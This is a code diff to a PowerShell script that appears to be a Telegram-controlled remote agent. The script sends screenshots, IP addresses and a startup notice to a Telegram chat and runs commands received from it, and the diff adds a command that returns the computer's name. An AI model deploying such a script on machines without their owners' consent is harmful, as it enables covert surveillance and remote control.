@@ -86,6 +86,9 @@ function Send-Screenshot {
     }
 }
 
+function Get-PCName {
+    return $env:COMPUTERNAME
+}
 # Notify when the system is running
 Send-TelegramMessage -chatId $userId -message "System is running"
 
@@ -127,6 +130,11 @@ while ($true) {
                 $publicIP = Get-PublicIP
                 $reply = "Local IP address: $localIP`nPublic IP address: $publicIP"
             }
+			
+			elseif ($text -eq "/get_pcname") {  # New command
+			$pcName = Get-PCName
+			$reply = "Computer Name: $pcName"
+			}
             elseif ($text -eq "/open_notepad") {
                 Start-Process notepad.exe
                 $reply = "Notepad opened."
